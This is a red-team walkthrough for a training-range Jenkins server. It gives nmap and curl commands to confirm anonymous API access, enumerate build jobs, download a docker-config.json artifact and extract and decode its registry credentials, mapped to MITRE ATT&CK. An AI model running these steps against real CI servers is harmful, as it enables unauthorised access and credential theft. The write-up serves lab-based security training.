# solve_red.md — M1 · dev-jenkins
## Red Team Solution Writeup
**Range:** RNG-DEV-01 · VIKAS TANTRA
**Machine:** M1 — Jenkins CI/CD Server
**Vulnerability:** Anonymous Jenkins API access and unauthenticated build artifact download
**MITRE ATT&CK:** T1190 · T1552.001
**Severity:** Hard

---

## Objective

From Kali, identify Jenkins on the confirmed range host, verify anonymous API access, enumerate build jobs, and retrieve the `docker-config.json` artifact. Keep the same Kali terminal open for M1–M5 so the private workspace and extracted credential variables remain available.

## Environment

| Item | Value |
|---|---|
| Entry | Direct access from Kali |
| Target | `203.0.3.36` |
| Jenkins port | `8080` |
| Authentication | Anonymous API access |
| Artifact | `pul-firmware-build` → `deploy-bundle/docker-config.json` |

## Step-by-Step Exploitation

### Step 1 — Scan the confirmed host

```bash
nmap -Pn -sV -p 22,8080,5000,9000,9200,8888 203.0.3.36
```

This scan confirmed SSH and all five range service ports open on `203.0.3.36`. The original jump-host key and `11.x.x.x/24` subnet are placeholders and do not apply to this deployment.

### Step 2 — Confirm anonymous Jenkins access

```bash
curl --max-time 8 -fsS http://203.0.3.36:8080/api/json | jq '{useSecurity, jobs}'
```

The unauthenticated request returned HTTP 200 and `useSecurity: false` in the API response.

### Step 3 — Enumerate build jobs

```bash
curl --globoff --max-time 8 -fsS "http://203.0.3.36:8080/api/json?tree=jobs[name,url,lastBuild[result,artifacts[*]]]" | jq .
```

`--globoff` is required because curl otherwise interprets the square brackets in the `tree=` query as URL glob syntax. The response lists `pul-firmware-build` with a successful build and `deploy-bundle/docker-config.json`.

### Step 4 — Download the build artifact

```bash
export RANGE3_DIR="$(mktemp -d /tmp/range3.XXXXXX)"
chmod 700 "$RANGE3_DIR"
curl --max-time 8 -fsS "http://203.0.3.36:8080/job/pul-firmware-build/lastSuccessfulBuild/artifact/deploy-bundle/docker-config.json" -o "$RANGE3_DIR/docker-config.json"
jq -r '(.auths | to_entries[0]) | "registry endpoint: \(.key)\ncredential present: \(.value.password != null)"' "$RANGE3_DIR/docker-config.json"
```

The artifact contains the registry username, password field, and base64 `auth` field. Values are redacted here because this writeup is public. The artifact's registry host is the literal placeholder `11.x.x.x:5000`; the registry in this deployment is reachable at `203.0.3.36:5000`.

### Step 5 — Check the credential fields

```bash
REGISTRY_USER="$(jq -r '.auths[] | .username' "$RANGE3_DIR/docker-config.json")"
REGISTRY_PASSWORD_CANDIDATE="$(jq -r '.auths[] | .password' "$RANGE3_DIR/docker-config.json")"
AUTH_VALUE="$(jq -r '.auths[] | .auth' "$RANGE3_DIR/docker-config.json" | base64 -d)"
if test "$AUTH_VALUE" = "$REGISTRY_USER:$REGISTRY_PASSWORD_CANDIDATE"; then echo 'auth field matches password field'; else echo 'auth field does not match password field'; fi
unset AUTH_VALUE
export REGISTRY_USER REGISTRY_PASSWORD_CANDIDATE
printf 'Registry credential loaded for %s\n' "$REGISTRY_USER"
```

On this artifact the base64 `auth` value decodes to the same username but a different password than the separate password field. Do not treat that password candidate as validated. M2's read API is anonymous, so the mismatch does not block the next documented steps.

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 |
| Discovery | Network Service Discovery | T1046 |
| Collection | Data from Local System | T1005 |

## Notes for Operator

The public Jenkins API response reports `useSecurity: false`. On the host, `config.xml` has `useSecurity=true` but uses `SecurityRealm$None` and `AuthorizationStrategy$Unsecured`, so the flag does not indicate that access is protected.
